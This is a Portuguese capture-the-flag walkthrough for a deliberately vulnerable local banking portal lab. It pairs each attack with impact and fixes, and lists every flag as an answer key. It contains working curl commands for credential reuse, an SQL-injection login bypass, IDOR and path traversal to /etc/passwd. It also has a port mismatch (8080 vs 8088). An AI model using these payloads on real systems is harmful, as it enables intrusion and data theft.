# Walkthrough - web-basic-01

Este walkthrough ensina o fluxo esperado para resolver o lab **web-basic-01**, baseado na aplicacao **MiniBank Internal Portal**.

O objetivo didatico e fazer o aluno descobrir rotas sensiveis por enumeracao logica, seguindo pistas visiveis na aplicacao, no codigo-fonte HTML e no `robots.txt`.

As quatro vulnerabilidades principais sao:

- SQL Injection no login
- IDOR em contas
- credencial vazada em arquivo publico
- Path Traversal / LFI controlado

O lab tambem ensina enumeracao de usuarios por mensagens de erro diferentes no login. Essa falha nao possui flag propria.

`robots.txt`, `/status`, comentario HTML, `/backup` e `/download` funcionam como pistas de enumeracao e validacao de impacto.

## 1. Preparacao do ambiente

Entre na pasta do lab:

```bash
cd ~/ctf-labs/web-basic-01
```

Suba os containers:

```bash
sudo docker compose up --build
```

O esperado e iniciar:

- aplicacao web em `http://localhost:8088`
- MySQL apenas na rede interna do Docker Compose
- somente a porta `8080` exposta no host

Valide a home:

```bash
curl -i http://localhost:8088
```

Voce deve receber HTTP `200 OK` e HTML com **MiniBank Internal Portal**.

## 2. Enumeracao inicial

Antes de explorar, observe. A primeira habilidade a treinar e encontrar pistas sem chute.

```bash
curl -i http://localhost:8088
curl -s http://localhost:8088 | head
curl -s http://localhost:8088 | grep -i "admin\|robots\|backup\|dev\|status"
```

O que observar:

- nome da aplicacao
- link para `/login`
- link para `/status`
- linguagem de portal interno legado
- pistas no codigo-fonte HTML

Teste uma rota inexistente para entender o padrao de erro:

```bash
curl -i http://localhost:8088/nao-existe
```

## 3. Comentario HTML

Visualize o codigo-fonte e procure comentarios:

```bash
curl -s http://localhost:8088 | grep -i "<!--"
```

Comentario esperado:

```html
<!-- revisar robots.txt antes de publicar o portal legado -->
```

Raciocinio: comentario HTML nao e controle de acesso, mas pode revelar processo interno, pendencias de publicacao e onde procurar proximas pistas.

Impacto: um atacante ou auditor pode usar esse tipo de comentario para guiar enumeracao.

Correcao: remover comentarios operacionais do HTML entregue ao cliente.

## 4. robots.txt

O comentario sugere verificar `robots.txt`.

```bash
curl -i http://localhost:8088/robots.txt
```

Conteudo esperado:

```text
User-agent: *
Disallow: /admin
Disallow: /backup
Disallow: /dev.txt
Disallow: /download
Disallow: /status
```

Raciocinio: `robots.txt` costuma listar rotas que nao deveriam ser indexadas. Isso nao protege nada, mas orienta a enumeracao.

Rotas descobertas:

- `/status`
- `/dev.txt`
- `/backup`
- `/download`
- `/admin`

## 5. Status verboso

Acesse a rota descoberta:

```bash
curl -i http://localhost:8088/status
```

Com `jq`, se disponivel:

```bash
curl -s http://localhost:8088/status | jq
```

O retorno revela informacoes como:

```json
{
  "status": "ok",
  "app": "MiniBank Internal Portal",
  "version": "1.4.2-dev",
  "env": "development",
  "internal_path": "/usr/src/app",
  "database": "mysql://minibank-db:3306/minibank"
}
```

Impacto: ajuda fingerprinting, confirma ambiente de desenvolvimento, mostra path interno e indica MySQL na rede interna.

Correcao: endpoints publicos de status devem retornar apenas informacao minima, como `{"status":"ok"}`. Diagnosticos detalhados devem ficar restritos.

## 6. Credencial vazada em arquivo publico

O `robots.txt` revelou `/dev.txt`. Acesse:

```bash
curl -i http://localhost:8088/dev.txt
```

O arquivo contem a credencial:

```text
backup_user:backup123
```

E a flag da vulnerabilidade de credencial exposta:

```text
FLAG{credencial_exposta_capturada}
```

Valide o impacto usando a credencial em `/backup`:

```bash
curl -i http://localhost:8088/backup
curl -i -u backup_user:backup123 http://localhost:8088/backup
```

Sem credencial, o esperado e HTTP `401`. Com `backup_user:backup123`, o esperado e HTTP `200 OK` com listagem de relatorios.

Impacto:

- arquivo estatico publico vazou credencial
- credencial permite acesso a area legada
- notas de desenvolvimento viraram superficie de ataque

Correcao:

- remover arquivos sensiveis de `app/public`
- rotacionar credenciais expostas
- usar variaveis de ambiente ou secret manager
- revisar publicacao de artefatos estaticos

## 7. SQL Injection no login

A rota de login usa MySQL e tambem vaza diferenca entre usuario inexistente e senha incorreta.

Valide a enumeracao de usuario inexistente:

```bash
curl -i -X POST http://localhost:8088/login \
  -d "username=naoexiste" \
  -d "password=teste"
```

Mensagem esperada:

```text
Usuario nao encontrado.
```

Agora valide usuario existente com senha incorreta:

```bash
curl -i -X POST http://localhost:8088/login \
  -d "username=joao" \
  -d "password=errada"
```

Mensagem esperada:

```text
Senha invalida.
```

Raciocinio: mensagens diferentes permitem descobrir quais usuarios existem antes de tentar outras tecnicas de autenticacao.

Impacto: um atacante pode reduzir tentativa e erro, montar lista de usuarios validos e combinar isso com senha fraca, phishing ou outros bugs.

No lab, essa enumeracao e intencional. Em sistemas reais, a correcao e retornar uma mensagem uniforme para falhas de login.

Depois valide comportamento normal:

```bash
curl -i -c joao.cookies \
  -d "username=joao&password=joao123" \
  http://localhost:8088/login
```

Confirme o dashboard:

```bash
curl -s -b joao.cookies http://localhost:8088/dashboard | grep -i "joao\|employee\|contas"
```

Agora valide falha de login:

```bash
curl -i \
  -d "username=admin&password=senha_errada" \
  http://localhost:8088/login
```

Como `admin` existe, a mensagem esperada e:

```text
Senha invalida.
```

O ponto vulneravel e a concatenacao direta de `username` e `password` na query SQL.

Payload funcional:

```text
username: admin' OR '1'='1' -- 
password: qualquercoisa
```

Inclua o espaco apos `--`; no MySQL ele faz parte do comentario SQL.

Com `curl`:

```bash
curl -i -c admin.cookies \
  --data-urlencode "username=admin' OR '1'='1' -- " \
  --data-urlencode "password=qualquercoisa" \
  http://localhost:8088/login
```

Valide a flag no dashboard:

```bash
curl -s -b admin.cookies http://localhost:8088/dashboard | grep -i "FLAG"
```

Flag:

```text
FLAG{sqli_capturada}
```

Impacto: bypass de autenticacao e acesso como usuario administrativo sem conhecer a senha.

Correcao:

- prepared statements
- queries parametrizadas
- hash forte de senha
- validacao de entrada
- respostas de erro uniformes

## 8. IDOR em contas

IDOR ocorre quando a aplicacao usa um ID direto na URL e nao valida se o usuario logado pode acessar aquele recurso.

Faca login como Joao:

```bash
curl -i -c joao.cookies \
  -d "username=joao&password=joao123" \
  http://localhost:8088/login
```

Acesse uma conta do Joao:

```bash
curl -s -b joao.cookies http://localhost:8088/account/1 | grep -i "Joao\|Conta\|Nota"
```

Troque apenas o ID para a conta de Maria:

```bash
curl -s -b joao.cookies http://localhost:8088/account/2 | grep -i "Maria\|FLAG\|Nota"
```

Flag:

```text
FLAG{idor_capturada}
```

Raciocinio: a aplicacao exige autenticacao, mas nao valida autorizacao sobre o recurso. Login e permissao de acesso nao sao a mesma coisa.

Impacto:

- acesso a dados de outro cliente/usuario
- vazamento de saldo, numero de conta e notas internas
- quebra de autorizacao horizontal

Correcao:

- validar dono do recurso no backend
- filtrar por `id` e `user_id`
- testar acesso cruzado entre usuarios

## 9. Path Traversal / LFI controlado

O `robots.txt` revelou `/download`. Teste primeiro um arquivo esperado:

```bash
curl -i "http://localhost:8088/download?file=public-info.txt"
```

Esse teste prova a funcionalidade normal do downloader legado.

Como `/backup` lista relatorios disponiveis, leia tambem o relatorio de Q2 pelo downloader:

```bash
curl -i "http://localhost:8088/download?file=report-q2.txt"
```

Observe a pista operacional:

```text
Durante a migracao, a configuracao antiga foi movida para o diretorio config.
Arquivo revisado pela equipe: legacy.conf
```

Depois prove a leitura fora do diretorio permitido lendo um arquivo conhecido do sistema:

```bash
curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
```

O retorno deve conter linhas tipicas como `root:x:0:0:root`.

Volte ao vazamento de `/status` e observe o caminho interno:

```json
"internal_path": "/usr/src/app"
```

Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` aponta para um arquivo legado dentro da aplicacao, acessivel voltando um diretorio:

```bash
curl -i "http://localhost:8088/download?file=../config/legacy.conf"
```

Flag:

```text
FLAG{path_traversal_capturada}
```

Raciocinio: o endpoint aceita um nome de arquivo e monta um caminho no servidor sem garantir que o caminho final continua dentro da pasta permitida.

Impacto:

- leitura de arquivo fora do diretorio esperado
- vazamento de segredos
- exposicao de configuracoes internas no container
- descoberta de caminhos reais a partir de endpoints verbosos como `/status`

Correcao:

- usar allowlist de arquivos
- normalizar caminho
- bloquear `../`
- garantir que o caminho final permanece dentro do diretorio permitido

## 10. Fluxo esperado do aluno

1. Acessar a home
2. Visualizar o codigo-fonte
3. Encontrar comentario HTML sugerindo `robots.txt`
4. Acessar `/robots.txt`
5. Descobrir `/status`, `/dev.txt`, `/backup` e `/download`
6. Acessar `/dev.txt` e encontrar credencial exposta
7. Usar credencial no `/backup`
8. Enumerar usuarios por mensagens diferentes no login
9. Explorar login com SQL Injection
10. Acessar contas e explorar IDOR
11. Ler `report-q2.txt` e identificar a pista `config` + `legacy.conf`
12. Provar Path Traversal com `/etc/passwd`
13. Usar `internal_path=/usr/src/app` para ler `../config/legacy.conf`

## 11. Validacao rapida

Com a aplicacao em execucao:

```bash
curl -i http://localhost:8088
curl -i http://localhost:8088/status
curl -i http://localhost:8088/robots.txt
curl -i http://localhost:8088/dev.txt
curl -i -X POST http://localhost:8088/login -d "username=naoexiste" -d "password=teste"
curl -i -X POST http://localhost:8088/login -d "username=joao" -d "password=errada"
curl -i "http://localhost:8088/download?file=public-info.txt"
curl -i "http://localhost:8088/download?file=report-q2.txt"
curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
curl -i "http://localhost:8088/download?file=../config/legacy.conf"
```

Valide as flags no repositorio usando o comando documentado em `../VALIDATION.md`.

Resultado esperado:

```text
FLAG{credencial_exposta_capturada}
FLAG{idor_capturada}
FLAG{path_traversal_capturada}
FLAG{sqli_capturada}
```
